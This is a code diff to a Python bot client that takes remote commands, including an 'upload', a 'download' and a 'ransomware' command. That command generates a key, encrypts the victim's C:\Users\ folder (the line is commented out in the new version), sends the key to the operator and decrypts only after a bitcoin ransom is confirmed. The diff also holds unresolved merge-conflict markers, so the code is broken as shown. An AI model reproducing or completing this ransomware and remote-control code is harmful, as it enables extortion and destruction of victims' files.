@@ -11,7 +11,7 @@ import platform
 import os
 from subprocess import check_output
 import ctypes
-from ransomware import Ransomware
+import ransomware
 class Bot(object):
     
 
@@ -69,7 +69,12 @@ class Bot(object):
             if self.ransom:
                 got_key = self.request_key(btc_addr)
                 if got_key:
+<<<<<<< HEAD
                     ransomware.decrypt_all_dir(got_key)
+=======
+                    
+                    Ransomware.decrypt_all_dir(got_key)
+>>>>>>> 4879ef1fc380a0529e8de9b0be636ffeb5848770
                     self.ransom = False
 
 
@@ -81,9 +86,10 @@ class Bot(object):
                 else:
                     self.send_output("incorrect num of args: upload <path>")
             elif cmdarr[0] == "ransomware":
-                    key = Ransomware.keygen()
-                    Ransomware.encrypt_all_dir("C:\\Users\\", key)
-                    self.send_key(key)
+                    key = ransomware.key_gen()
+                    print("ransom with key " + str(key))
+                    #Ransomware.encrypt_all_dir("C:\\Users\\", key)
+                    self.send_key(str(key))
                     self.ransom = True
 
             elif cmdarr[0] == "download":
